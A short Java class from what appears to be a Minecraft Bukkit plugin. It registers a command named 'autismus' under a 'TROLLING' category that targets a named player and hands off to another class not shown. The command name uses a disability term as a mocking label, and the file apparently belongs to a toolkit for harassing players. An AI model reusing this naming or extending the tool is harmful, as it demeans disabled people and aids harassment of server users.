package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Command_AUTISMUS extends CommandBase {

    public Command_AUTISMUS() {
        super("autismus", "<Spieler>" + " §d| " + ChatColor.GRAY + "Spieler in seiner Welt", Category.TROLLING);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_AUTISMUS2(this, args, p));
            } catch (Exception var4) {
                Bukkit.broadcastMessage(var4.getMessage());
            }
        }
    }

}
